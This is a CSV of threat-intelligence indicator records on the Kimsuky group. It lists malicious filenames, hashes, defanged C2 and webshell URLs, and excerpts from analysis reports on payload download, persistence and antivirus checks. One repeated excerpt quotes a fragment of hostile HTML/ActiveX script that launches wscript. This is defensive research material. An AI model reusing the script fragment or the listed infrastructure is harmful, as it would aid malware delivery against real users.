1.0.0,actor--kimsuky,artifact--sha256:c2b71ac7d844cd4f5e92836e640045e845a2a5052f9009074e8c036fa73c76fd,observation--sha256:9eb7a06885a7db730ccc79343c0579b0310c65205de56160a6eaa0cb1f180d02,file-name,advupdate.exe,advupdate.exe,candidate,,unknown,unknown,not-stated,2023-10-16T00:00:00Z,source--darkhorse-2023,kimsuky/20231016_threat_inteligence_report_DarkHorse.pdf,"{""page"": 31}","[""activity--darkhorse""]",[],"[""infra--lookalike-domains""]","[""c2"",""payload"",""phishing""]",1,false,medium,TLP:CLEAR,pdf-text,"Threat IntelligenceReport ○사용자가시스템에로그온할경우, 이전과정에서추가한레지스트리에의해VBS파일이실행됩니다. 실행된VBS파일은Powershell 스크립트를통해공격자의C2서버에서“advupdate.exe” 라는파일을‘%tmp%’ 경로에다운로드후실행합니다. ○분석시점에C2서버에접속이불가하여다운로드되는파일은확보하지못했지만RAT또는인포스틸러유형의악성코드로추정하고있습니다. [그림4-4] VBS1유형의DAT, VBS파일 Genians SecurityCenter 30",
1.0.0,actor--kimsuky,artifact--sha256:c2b71ac7d844cd4f5e92836e640045e845a2a5052f9009074e8c036fa73c76fd,observation--sha256:6e132ef70bbb813a9ed09b13a561cdc9d90eb84fa9528b98e87e84293278b759,file-name,advupdate.exe,advupdate.exe,candidate,2022-03-01T00:00:00Z,month,known,same-record,2023-10-16T00:00:00Z,source--darkhorse-2023,kimsuky/20231016_threat_inteligence_report_DarkHorse.pdf,"{""page"": 54}","[""activity--darkhorse""]",[],"[""infra--lookalike-domains""]","[""c2"",""payload"",""phishing""]",1,false,medium,TLP:CLEAR,pdf-text,"Threat IntelligenceReport 4.8. 경로및파일명유사도 ○VBS 1 유형부터JSE 3 유형까지는동일한레지스트리경로및레지스트리이름을사용했으며, JSE 4 유형부터 “Document” 가 아닌 “Update” 라는 레지스트리 이름을사용하고있습니다. ○또한, DAT, VBS, JSE 파일의이름및저장경로에서높은유사도를보이고있으며,JSE2유형부터는JSE파일명과경로에변화를준사실을확인할수있습니다. [표4-2] 경로및파일명유사도 Genians SecurityCenter 53 유형 탐지날짜 CHM파일명 레지스트리경로 DAT파일경로 VBS/ JSE파일경로 페이로드경로 VBS1 2022-03 User Guide.chmasset.chmwages.chm HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\Document %USERPROFILE%\Links\Document.dat %USERPROFILE%\Links\Document.vbs %tmp%\a",
1.0.0,actor--kimsuky,artifact--sha256:c2b71ac7d844cd4f5e92836e640045e845a2a5052f9009074e8c036fa73c76fd,observation--sha256:c0c1a19c77ee94b6b81c8c8ea2765bde708732048a172772d91a4ab0bc435c27,file-name,advupdate.exe,advupdate.exe,candidate,,unknown,unknown,not-stated,2023-10-16T00:00:00Z,source--darkhorse-2023,kimsuky/20231016_threat_inteligence_report_DarkHorse.pdf,"{""page"": 56}","[""activity--darkhorse""]",[],"[""infra--lookalike-domains""]","[""c2"",""payload"",""phishing""]",1,false,medium,TLP:CLEAR,pdf-text,"Threat IntelligenceReport </SCRIPT> inner;A.Click(); inner ='<OBJECTid=""B""classid=""clsid:52a2aaae-085d-4187-97ea-8c30db990436"" style=""visibility:hidden"">';inner +='<PARAMname=""Command""value=""ShortCut""><PARAMname=""Button""value=""Bitmap:shortcut"">';inner +='<PARAMname=""Item1""value="",wscript,C:\\Users\\Public\\Libraries\\Docs.jseP""><PARAMname=""Item2""value=""273,1,1""></OBJECT>';document.getElementById('par').innerHTML=inner;B.Click(); </script> [표4-3] HTML코드유사도 4.10. Powershell 코드유사도 ○VBS 와JSE 유형모두Pow",
1.0.0,actor--kimsuky,artifact--sha256:01e11f31680ed7782f5834ff07dc73c832cf515f6b2fe78b40469c1aee52dfd2,observation--sha256:3b87fa44df1070bfe982639dc10e85f5d2f65e04652defeda52f9a73281a674f,file-name,ain_La_1226.exe,ain_La_1226.exe,candidate,2023-04-13T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 53}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"53 hxxps://listmember.info/tygygvftsfx8g6 8Gu8x7s78gsx6519.php HackTool/Win.RdpScan.R437610 Second, 27.255.***.***, where the webshell URL is mapped, is the IP assigned to this host and is an IP band frequently used by the Kimsuky organization when building C2. 27.255.80.170(KR) hxxps://a1ive.info/tygygvftsfx8g68Gu8 x7s78gsx6.php 2023-04-13 3 4 I used it. In the table below (Table 24), excluding webshell URLs 14 and 15, three patterns can be found in webshell URLs 1 to 13. C:\Users\DefaultUser\D",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:adfc213b6a1471691934bdd0e1a9893884236b82d4d05b121246395f7c0f7cfc,observation--sha256:484ea4b8ded0a04b61d771f968d58f7d152fb42d26a87d8e9156911f7898c4ac,file-name,alg.exe,alg.exe,candidate,,unknown,unknown,not-stated,2023-10-16T00:00:00Z,source--darkhorse-2023,kimsuky/20231016_threat_inteligence_report_DarkHorse.pdf,"{""page"": 14}","[""activity--darkhorse""]",[],"[""infra--lookalike-domains""]","[""c2"",""payload"",""phishing""]",1,false,medium,TLP:CLEAR,pdf-text,"Threat IntelligenceReport ○해당JSE파일은먼저“makeAjax” 함수를실행합니다. 해당함수는공격자의C2서버에GET요청을전송합니다. 만약C2서버로부터수신한응답코드가200(성공)이면, 서버로부터수신한응답패킷의Body데이터를%tmp% 경로에alg.exe이름으로저장합니다. ○만약, alg.exe파일이지정된경로에존재하고HTML 의스크립트에서전달한인자값이존재한다면, 레지스트리에해당JSE파일을등록합니다. 하지만“scReg”변수가선언되지않아해당코드는실행되지않습니다. [그림3-8] makeAjax함수 Genians SecurityCenter 13",
1.0.0,actor--kimsuky,artifact--sha256:adfc213b6a1471691934bdd0e1a9893884236b82d4d05b121246395f7c0f7cfc,observation--sha256:1940d1887ed1d3af3213901481772165b4b40752da4362e7c9c11bd99cbbea6b,file-name,alg.exe,alg.exe,candidate,,unknown,unknown,not-stated,2023-10-16T00:00:00Z,source--darkhorse-2023,kimsuky/20231016_threat_inteligence_report_DarkHorse.pdf,"{""page"": 15}","[""activity--darkhorse""]",[],"[""infra--lookalike-domains""]","[""c2"",""payload"",""phishing""]",1,false,medium,TLP:CLEAR,pdf-text,"Threat IntelligenceReport ○다음으로“modifyApp” 함수를실행합니다. 이함수는이전과정에서다운로드한alg.exe파일의첫번째데이터를“MZ” 문자열로수정합니다. ○C2서버에서다운로드되는“alg.exe” 파일을확보하지못했지만, 다운로드되는파일의시그니처가정상적인실행파일의시그니처(“ MZ”) 가아니라는것을추정할수있습니다. 이는보안솔루션의탐지를피하기위한방법으로보입니다. [그림3-9] modifyApp함수 Genians SecurityCenter 14",
1.0.0,actor--kimsuky,artifact--sha256:adfc213b6a1471691934bdd0e1a9893884236b82d4d05b121246395f7c0f7cfc,observation--sha256:ecc64bf2c3d062a1e1e2661f717423639c4bd1d5073b0c13add92a6a24ac1c15,file-name,alg.exe,alg.exe,candidate,,unknown,unknown,not-stated,2023-10-16T00:00:00Z,source--darkhorse-2023,kimsuky/20231016_threat_inteligence_report_DarkHorse.pdf,"{""page"": 16}","[""activity--darkhorse""]",[],"[""infra--lookalike-domains""]","[""c2"",""payload"",""phishing""]",1,false,medium,TLP:CLEAR,pdf-text,"Threat IntelligenceReport ○이후, 실행되는“isV3” 함수는특정보안솔루션의존재여부를확인합니다.‘C:/ProgramFiles/AhnLab’ 경로가존재하고해당경로의하위폴더에“V3”폴더가존재하는지확인해조건에따라True 와False 를반환합니다. [그림3-10] isV3함수 ○이전함수에서False 를반환( AhnLab또는V3폴더가존재하지않음)할경우,alg.exe 를실행합니다. True 를반환( V3폴더가존재)할경우, 시스템이시작될때alg.exe 가실행될수있도록레지스트리자동실행경로에등록합니다. [그림3-11] alg.exe실행조건문 Genians SecurityCenter 15",
1.0.0,actor--kimsuky,artifact--sha256:adfc213b6a1471691934bdd0e1a9893884236b82d4d05b121246395f7c0f7cfc,observation--sha256:affdaea7fcc4b4431c62e2cb12ff0ace04c9c35ce93d7cf802d239b03ef47fa2,file-name,alg.exe,alg.exe,candidate,,unknown,unknown,not-stated,2023-10-16T00:00:00Z,source--darkhorse-2023,kimsuky/20231016_threat_inteligence_report_DarkHorse.pdf,"{""page"": 18}","[""activity--darkhorse""]",[],"[""infra--lookalike-domains""]","[""c2"",""payload"",""phishing""]",1,false,medium,TLP:CLEAR,pdf-text,Threat IntelligenceReport 3.4. alg.exe ○같은시기의유사한CHM공격에서“alg.exe” 라는파일명을가진RAT유형의악성코드를확보했고분석을진행했습니다. 파일명 alg.exe 파일타입 64Bit / EXE/ .NET MD5 a8c5fc1b5fd0f45c1598dc78204b72f6 PDB D:\MyProjects\SelfTraining\Csharp\ReconApp-Final\ReconApp\obj\x64\Release\alg.pdb C2 plifty[.]lat/uEH5J[표3-2] alg.exe상세정보 ○해당악성코드의일부문자열은탐지및분석을피하기위해[AES-256+BASE64]알고리즘을통해암호화되어있습니다. [그림3-13] 난독화된문자열 [그림3-14] 문자열복호화루틴 Genians SecurityCenter 17,
1.0.0,actor--kimsuky,artifact--sha256:adfc213b6a1471691934bdd0e1a9893884236b82d4d05b121246395f7c0f7cfc,observation--sha256:7fa884f2e286147ebde22ac6e7503be6fa99147b9a29cd11d391b49ed593ac9b,file-name,alg.exe,alg.exe,candidate,,unknown,unknown,not-stated,2023-10-16T00:00:00Z,source--darkhorse-2023,kimsuky/20231016_threat_inteligence_report_DarkHorse.pdf,"{""page"": 2}","[""activity--darkhorse""]",[],"[""infra--lookalike-domains""]","[""c2"",""payload"",""phishing""]",1,false,medium,TLP:CLEAR,pdf-text,Threat IntelligenceReport - 목차(CONTENTS) - 1. 개요(Overview)...........................................................................21.1. 위협식별(Threat Hunting)............................................................... 21.2. 공격전술및전략유형(TTPs)............................................................. 3 2. 공격시나리오(AttackScenario)....................................................32.1. 공격흐름도(AttackFlowchart)..........................................................32.2. 초기접근단계-피싱(Initial Acces,
1.0.0,actor--kimsuky,artifact--sha256:adfc213b6a1471691934bdd0e1a9893884236b82d4d05b121246395f7c0f7cfc,observation--sha256:dfff6ca418d3bfb09888cefc35a677a83892d7d1750e1b4167c5b0dce82f154a,file-name,alg.exe,alg.exe,candidate,,unknown,unknown,not-stated,2023-10-16T00:00:00Z,source--darkhorse-2023,kimsuky/20231016_threat_inteligence_report_DarkHorse.pdf,"{""page"": 51}","[""activity--darkhorse""]",[],"[""infra--lookalike-domains""]","[""c2"",""payload"",""phishing""]",1,false,medium,TLP:CLEAR,pdf-text,"Threat IntelligenceReport ○해당JSE 파일은지속성을유지하기위해JSE 파일을레지스트리자동실행경로에등록합니다. 이후, Powershell 을 통해 공격자의 C2 서버에서 “alg.exe” 파일을다운로드후실행합니다. [그림4-27] JSE3유형의코드 [그림4-28] GenianEDR 을통한JSE3유형탐지 Genians SecurityCenter 50",
1.0.0,actor--kimsuky,artifact--sha256:adfc213b6a1471691934bdd0e1a9893884236b82d4d05b121246395f7c0f7cfc,observation--sha256:acbda9e5b2bef1e7ec663f53caf67609deb439572d51d9a5044dc4e46ace9d91,file-name,alg.exe,alg.exe,candidate,2022-03-01T00:00:00Z,month,known,same-record,2023-10-16T00:00:00Z,source--darkhorse-2023,kimsuky/20231016_threat_inteligence_report_DarkHorse.pdf,"{""page"": 54}","[""activity--darkhorse""]",[],"[""infra--lookalike-domains""]","[""c2"",""payload"",""phishing""]",1,false,medium,TLP:CLEAR,pdf-text,"Threat IntelligenceReport 4.8. 경로및파일명유사도 ○VBS 1 유형부터JSE 3 유형까지는동일한레지스트리경로및레지스트리이름을사용했으며, JSE 4 유형부터 “Document” 가 아닌 “Update” 라는 레지스트리 이름을사용하고있습니다. ○또한, DAT, VBS, JSE 파일의이름및저장경로에서높은유사도를보이고있으며,JSE2유형부터는JSE파일명과경로에변화를준사실을확인할수있습니다. [표4-2] 경로및파일명유사도 Genians SecurityCenter 53 유형 탐지날짜 CHM파일명 레지스트리경로 DAT파일경로 VBS/ JSE파일경로 페이로드경로 VBS1 2022-03 User Guide.chmasset.chmwages.chm HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\Document %USERPROFILE%\Links\Document.dat %USERPROFILE%\Links\Document.vbs %tmp%\a",
1.0.0,actor--kimsuky,artifact--sha256:adfc213b6a1471691934bdd0e1a9893884236b82d4d05b121246395f7c0f7cfc,observation--sha256:9329855a9408751aafdf59fb732bc22df2afc504a2322d6c9ac1f0cba1dbc125,file-name,alg.exe,alg.exe,candidate,,unknown,unknown,not-stated,2023-10-16T00:00:00Z,source--darkhorse-2023,kimsuky/20231016_threat_inteligence_report_DarkHorse.pdf,"{""page"": 56}","[""activity--darkhorse""]",[],"[""infra--lookalike-domains""]","[""c2"",""payload"",""phishing""]",1,false,medium,TLP:CLEAR,pdf-text,"Threat IntelligenceReport </SCRIPT> inner;A.Click(); inner ='<OBJECTid=""B""classid=""clsid:52a2aaae-085d-4187-97ea-8c30db990436"" style=""visibility:hidden"">';inner +='<PARAMname=""Command""value=""ShortCut""><PARAMname=""Button""value=""Bitmap:shortcut"">';inner +='<PARAMname=""Item1""value="",wscript,C:\\Users\\Public\\Libraries\\Docs.jseP""><PARAMname=""Item2""value=""273,1,1""></OBJECT>';document.getElementById('par').innerHTML=inner;B.Click(); </script> [표4-3] HTML코드유사도 4.10. Powershell 코드유사도 ○VBS 와JSE 유형모두Pow",
1.0.0,actor--kimsuky,artifact--sha256:0969dbf993e200276258c6e8d72a5e7d72665b9993ae2abbfa0fa85cc0ab6c72,observation--sha256:11382dc5b481a09ed5b037ccc29b4a2b51b5fdd979c5ab8f23d57ec1440c5bf5,file-name,alg.pdb,alg.pdb,candidate,,unknown,unknown,not-stated,2023-10-16T00:00:00Z,source--darkhorse-2023,kimsuky/20231016_threat_inteligence_report_DarkHorse.pdf,"{""page"": 18}","[""activity--darkhorse""]",[],"[""infra--lookalike-domains""]","[""c2"",""payload"",""phishing""]",1,false,medium,TLP:CLEAR,pdf-text,Threat IntelligenceReport 3.4. alg.exe ○같은시기의유사한CHM공격에서“alg.exe” 라는파일명을가진RAT유형의악성코드를확보했고분석을진행했습니다. 파일명 alg.exe 파일타입 64Bit / EXE/ .NET MD5 a8c5fc1b5fd0f45c1598dc78204b72f6 PDB D:\MyProjects\SelfTraining\Csharp\ReconApp-Final\ReconApp\obj\x64\Release\alg.pdb C2 plifty[.]lat/uEH5J[표3-2] alg.exe상세정보 ○해당악성코드의일부문자열은탐지및분석을피하기위해[AES-256+BASE64]알고리즘을통해암호화되어있습니다. [그림3-13] 난독화된문자열 [그림3-14] 문자열복호화루틴 Genians SecurityCenter 17,
1.0.0,actor--kimsuky,artifact--sha256:6622518fe169afa3fdad78d6f574a13d69447a818995b628a9febd6dee5b3663,observation--sha256:442b6a3d85f7935fbb6671bd3736cc3cbb18daa8f291a3b61f8c5ba2342f0cbc,file-name,alysvc.dll,alysvc.dll,candidate,2021-07-01T00:00:00Z,month,inferred,report-observation-window,2021-07-01T00:00:00Z,source--kgh-2021,kimsuky/Kimsuky-KGH.pdf,"{""page"": 11}",[],"[""malware--kgh""]","[""infra--compromised-web-servers""]","[""c2"",""payload""]",0,false,high,TLP:CLEAR,pdf-text,微步在线科技有限公司 | www.threatbook.cn | 400-030-1051 图[17] . 窃密函数流程 删除 FTP 服务器上的文件 KEEPALIVE，再重新创建一份同名文件，攻击者可根据该 文件判断主机存活状态。之后读取 FTP 服务器对应主机目录中的文件 cmd.txt，从中读取远 程指令并执行对应功能。 图[18] . 从 C2 服务器获取远程指令 远程指令代码如下： 指令 功能 B 上传指定目录文件 C 删除注册表 monstate 标记 D 下载文件，以 LoadLibrary 形式加载执行 E 加载 alysvc.dll，调用导出函数 SystemCheck F 屏幕截图 1,
1.0.0,actor--kimsuky,artifact--sha256:0c53bf7c399bfbfaa6cf8f767a6b6bd3e1a0a676b24335e44c66feb2de8b47f3,observation--sha256:7d904ec9cc1eebc47161c56a9b7147e8ac3233a286660642e3cdb8f98572f41c,file-name,analytics.js,analytics.js,candidate,,unknown,unknown,not-stated,2021-10-01T00:00:00Z,source--operation-newton,kimsuky/Operation_Newton_Kimsuky-APPLE(SEED).pdf,"{""page"": 10}","[""activity--operation-newton""]","[""malware--appleseed""]","[""infra--compromised-web-servers""]","[""c2"",""download"",""exfiltration"",""payload""]",1,false,high,TLP:CLEAR,pdf-text,"OPERATION NEWTON: HI KIMSUKY? DID AN APPLE(SEED) REALLY FALL... KIM ET AL. 10 VIRUS BULLETIN CONFERENCE OCTOBER 2021 Stage 01: analytics.js?_=[BASE64(ID)]&token=[BASE64(Target)]=&delay=30&m=login After a warning window is displayed indicating that the session has been terminated and moving to the login page, it is disguised as if it has moved to the webmail login page (any page can be loaded through the iframe tag). The keylogging script works on the moved webmail disguised page, and the account",
1.0.0,actor--kimsuky,artifact--sha256:0c53bf7c399bfbfaa6cf8f767a6b6bd3e1a0a676b24335e44c66feb2de8b47f3,observation--sha256:a3933d50619a6dafaf31b88587a370f95864ab263d7585a3f48f83cb26e9c0a0,file-name,analytics.js,analytics.js,candidate,,unknown,unknown,not-stated,2021-10-01T00:00:00Z,source--operation-newton,kimsuky/Operation_Newton_Kimsuky-APPLE(SEED).pdf,"{""page"": 9}","[""activity--operation-newton""]","[""malware--appleseed""]","[""infra--compromised-web-servers""]","[""c2"",""download"",""exfiltration"",""payload""]",1,false,high,TLP:CLEAR,pdf-text,"OPERATION NEWTON: HI KIMSUKY? DID AN APPLE(SEED) REALLY FALL... KIM ET AL. 9VIRUS BULLETIN CONFERENCE OCTOBER 2021 3.1 Phishing: spear-phishing link When browsing the email, it looks like it contains simple text (‘>> erroneous sending email’), but in fact it contains HTML code. One of the problems was that when the email was read on the webmail service, it was moved to the phishing page configured by the attacker.  Mailing Toolkit (phishing email sending URL): wallet-info.esy.es/mail_ok.php  S",
1.0.0,actor--kimsuky,artifact--sha256:f0fc535cd380b11a4c21f26c9981aca722bf060fb026010d92a3864b469e0d91,observation--sha256:13cfc5215074dc5eefbe9f728f9a6a4f261db5f13985a298532eee9107c0ee28,file-name,apach_x64.exe,apach_x64.exe,candidate,2018-07-15T00:00:00Z,day,known,same-record,2019-02-01T00:00:00Z,source--babyshark-xlsx,baby-kimsuky/BabyShark Rule - Mal Cert and others.xlsx,"{""row"": 14, ""sheet"": ""check-results_Venom23-155099628""}",[],"[""malware--babyshark""]",[],"[""payload""]",0,false,high,TLP:CLEAR,xlsx-row,"adfd949ac91187061b44d8c8415ec5003d26164ff57d6c47e4ecaf8c9b80795f malicious MAL_PE_Type_BabyShark_Loader 33 Microsoft: Trojan:Win32/Stolpen.A / Kaspersky: Trojan-Banker.Win32.ClipBanker.ba / McAfee: Trojan-StolenPen / CrowdStrike: malicious_confidence_100% (W) / ESET-NOD32: Win64/Spy.Sysnokki.B / Symantec: Trojan Horse / Sophos: Mal/Generic-S / GData: Trojan.GenericKD.31407858 GetSync.exe, GetSync, apach_x64.exe 2018-07-15 04:24:34 UTC ( 7 months, 2 weeks ago ) 2019-02-15 04:24:58 Win32 EXE 9d1e1",
1.0.0,actor--kimsuky,artifact--sha256:a6e3774f099e7f8f04f4b90592c4d5c5e6ebe5cdae589af2834db6ee5bc3ac47,observation--sha256:114ed306e36aa632924c0884544d7bdc5ec3dc4589acfb6fa7f57319b8aaa056,file-name,apach_x86.exe,apach_x86.exe,candidate,2018-07-15T00:00:00Z,day,known,same-record,2019-02-01T00:00:00Z,source--babyshark-xlsx,baby-kimsuky/BabyShark Rule - Mal Cert and others.xlsx,"{""row"": 4, ""sheet"": ""check-results_Venom23-155099628""}",[],"[""malware--babyshark""]",[],"[""payload""]",0,false,high,TLP:CLEAR,xlsx-row,"4dcd46e838bb7a764bc35b4e4a3a2e693fedcda5334d54b982bea29b5f4887a3 malicious MAL_PE_Type_BabyShark_Loader 39 Microsoft: Trojan:Win32/Stolpen.A / Kaspersky: Trojan-Banker.Win32.ClipBanker.ai / McAfee: RDN/Generic PWS.y / CrowdStrike: malicious_confidence_100% (W) / ESET-NOD32: a variant of Win32/Spy.Sysnokki.C / Symantec: Trojan Horse / Sophos: Mal/Generic-S / GData: Trojan.Generic.23083176 GetSync.exe, GetSync, apach_x86.exe 2018-07-15 04:24:36 UTC ( 7 months, 2 weeks ago ) 2019-02-14 03:46:06 Win",
1.0.0,actor--kimsuky,artifact--sha256:d9157bd2c8c5fc6249a7ac9236ab9dda6e1b1c02f6fdd3db8b2f7b77d9f4412d,observation--sha256:33ea0109c404546307f874e2fe7f66e5e8ec9dfb5083e0ecda9de57190e3ef68,file-name,app-debug.apk,app-debug.apk,candidate,,unknown,unknown,not-stated,2021-10-01T00:00:00Z,source--operation-newton,kimsuky/Operation_Newton_Kimsuky-APPLE(SEED).pdf,"{""page"": 22}","[""activity--operation-newton""]","[""malware--appleseed""]","[""infra--compromised-web-servers""]","[""c2"",""download"",""exfiltration"",""payload""]",1,false,high,TLP:CLEAR,pdf-text,"OPERATION NEWTON: HI KIMSUKY? DID AN APPLE(SEED) REALLY FALL... KIM ET AL. 22 VIRUS BULLETIN CONFERENCE OCTOBER 2021 Example of command execution results using command injection. Targeting mobile devices (AppleSeed APK) As a result of continuously tracking and monitoring the server using the OPSEC fail, we hunted the AppleSeed app (APK) targeting Android mobile device users in the wild.  MD5 : fcf58420df4237b142ef3002bfe0f5d9  Filename : app-debug.apk  Package name: com.android.maintenance  ",
1.0.0,actor--kimsuky,artifact--sha256:e888e239266c816b1f35c29f64c53b79980ef43346411144e0b65b6260cb41bd,observation--sha256:bc6b433fd34468a66e1fb81fc8c79a537676ed7aea0d5b6190324a9a50e92847,file-name,appeal.exe,appeal.exe,candidate,2023-07-17T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 84}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Executes 10:17:22 Connect to N/A 10:29:25 2023-07-17 2023-07-18 Operation Covert Stalker Report File Less explorer.exe network 10:29:25 explorer.exe Process Executes 5911.pdf.exe N/A 2023-07-18 mshta.exe 2023-07-14 2023-07-14 process process network Creates This is an excerpt of some of the malicious actions performed by the Kimsuky organization on 14*.10*.23*.21*(US), which occurs through malware testing. mshta.exe 10:29:25 10:17:22 2023-07-18 [+] (ASEC Blog) “Distributing malware disguised as ",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:9338a75038f351cba285c6cf8ceafd7cc3ad36468513784241febec869055caa,observation--sha256:f67b247cefc5dacad6d364a7eda6157c855019f4c1322293de6b80fe0b62edd4,file-name,audiodg.exe,audiodg.exe,candidate,,unknown,unknown,not-stated,2023-10-16T00:00:00Z,source--darkhorse-2023,kimsuky/20231016_threat_inteligence_report_DarkHorse.pdf,"{""page"": 35}","[""activity--darkhorse""]",[],"[""infra--lookalike-domains""]","[""c2"",""payload"",""phishing""]",1,false,medium,TLP:CLEAR,pdf-text,"Threat IntelligenceReport ○JSE파일은인코딩된JavaScript 로디코딩과정을거쳐야원본코드를확인할수있습니다. 최종실행되는JSE파일의원본코드는아래그림과같으며,Powershell 을통해공격자의C2서버에서“audiodg.exe” 라는악성코드를‘%tmp%’ 경로에다운로드하고실행합니다. [그림4-9] JSE1유형의DAT, JSE파일 Genians SecurityCenter 34",
1.0.0,actor--kimsuky,artifact--sha256:9338a75038f351cba285c6cf8ceafd7cc3ad36468513784241febec869055caa,observation--sha256:a9ef1ae6c0ce48c05f00f6a576909a34697c15b12b181fd1866a17cf65129740,file-name,audiodg.exe,audiodg.exe,candidate,2022-03-01T00:00:00Z,month,known,same-record,2023-10-16T00:00:00Z,source--darkhorse-2023,kimsuky/20231016_threat_inteligence_report_DarkHorse.pdf,"{""page"": 54}","[""activity--darkhorse""]",[],"[""infra--lookalike-domains""]","[""c2"",""payload"",""phishing""]",1,false,medium,TLP:CLEAR,pdf-text,"Threat IntelligenceReport 4.8. 경로및파일명유사도 ○VBS 1 유형부터JSE 3 유형까지는동일한레지스트리경로및레지스트리이름을사용했으며, JSE 4 유형부터 “Document” 가 아닌 “Update” 라는 레지스트리 이름을사용하고있습니다. ○또한, DAT, VBS, JSE 파일의이름및저장경로에서높은유사도를보이고있으며,JSE2유형부터는JSE파일명과경로에변화를준사실을확인할수있습니다. [표4-2] 경로및파일명유사도 Genians SecurityCenter 53 유형 탐지날짜 CHM파일명 레지스트리경로 DAT파일경로 VBS/ JSE파일경로 페이로드경로 VBS1 2022-03 User Guide.chmasset.chmwages.chm HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\Document %USERPROFILE%\Links\Document.dat %USERPROFILE%\Links\Document.vbs %tmp%\a",
1.0.0,actor--kimsuky,artifact--sha256:9338a75038f351cba285c6cf8ceafd7cc3ad36468513784241febec869055caa,observation--sha256:2bc94feb2203983d5a05553b5672439c5f5c98097671e730b60a3593a330da5a,file-name,audiodg.exe,audiodg.exe,candidate,,unknown,unknown,not-stated,2023-10-16T00:00:00Z,source--darkhorse-2023,kimsuky/20231016_threat_inteligence_report_DarkHorse.pdf,"{""page"": 56}","[""activity--darkhorse""]",[],"[""infra--lookalike-domains""]","[""c2"",""payload"",""phishing""]",1,false,medium,TLP:CLEAR,pdf-text,"Threat IntelligenceReport </SCRIPT> inner;A.Click(); inner ='<OBJECTid=""B""classid=""clsid:52a2aaae-085d-4187-97ea-8c30db990436"" style=""visibility:hidden"">';inner +='<PARAMname=""Command""value=""ShortCut""><PARAMname=""Button""value=""Bitmap:shortcut"">';inner +='<PARAMname=""Item1""value="",wscript,C:\\Users\\Public\\Libraries\\Docs.jseP""><PARAMname=""Item2""value=""273,1,1""></OBJECT>';document.getElementById('par').innerHTML=inner;B.Click(); </script> [표4-3] HTML코드유사도 4.10. Powershell 코드유사도 ○VBS 와JSE 유형모두Pow",
1.0.0,actor--kimsuky,artifact--sha256:3bd08b10a123b82e2d873fa2b40d1102f479c8689970b59452666b254fcb4b88,observation--sha256:75568906482ac4fd76dca76ad5e8458e8359ffac07b3f92bab58db997c158fe6,file-name,auth.js,auth.js,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--030e0bafc14e2552,kimsuky/APTDown/article.txt,"{""line"": 730}",[],[],[],[],0,false,medium,TLP:CLEAR,text-line,extension injects `auth.js` into the browser to steal the login,Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:b7771c9bdd5c0e1069a77048be3f5374442d9f65141bf90df7dc92097e135b40,observation--sha256:aa31fe5bd948d5deda1a842a8537ea773629a851935a7303cb48fbf5be3b1f08,file-name,auto_d.php,auto_d.php,candidate,2021-08-17T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 9}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Operation Covert Stalker Report 9 auto_n.php HackTool/Win.RdpScan (2021.08.17.03) e840bf3477150392720fe8a9b1f8a4d6 result.txt.lnk fff43c6690eb87eb194aae01d6d77f1e dd6b31c3a9881eb64b719568a53cb2fb enc(2).txt North Korea's position on the use of nuclear weapons and Trojan/Win32.NsSpy (2017.09.14.00) Kang Jeong-il, authoritarianism HackTool/Script.Agent.SC193455 (2023.10.19.00) f082f689394ac71764bca90558b52c4e RdpAttack_Ksb04_x64.exe index.php tmp1030574661.vbs enc.txt f2bf557f8e90522d67b773d56a898",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:0a1148c97e528e35e62fc7b033f3da374c816cd1b0edc804b7af223d9859157d,observation--sha256:b04a3b0b541a9cba01d413c86a91b6d797f09fd32502245f81e61db8cfd4158d,file-name,auto_n.php,auto_n.php,candidate,2021-08-17T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 9}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Operation Covert Stalker Report 9 auto_n.php HackTool/Win.RdpScan (2021.08.17.03) e840bf3477150392720fe8a9b1f8a4d6 result.txt.lnk fff43c6690eb87eb194aae01d6d77f1e dd6b31c3a9881eb64b719568a53cb2fb enc(2).txt North Korea's position on the use of nuclear weapons and Trojan/Win32.NsSpy (2017.09.14.00) Kang Jeong-il, authoritarianism HackTool/Script.Agent.SC193455 (2023.10.19.00) f082f689394ac71764bca90558b52c4e RdpAttack_Ksb04_x64.exe index.php tmp1030574661.vbs enc.txt f2bf557f8e90522d67b773d56a898",Actor-directory corpus sweep; ambiguous values remain candidates.
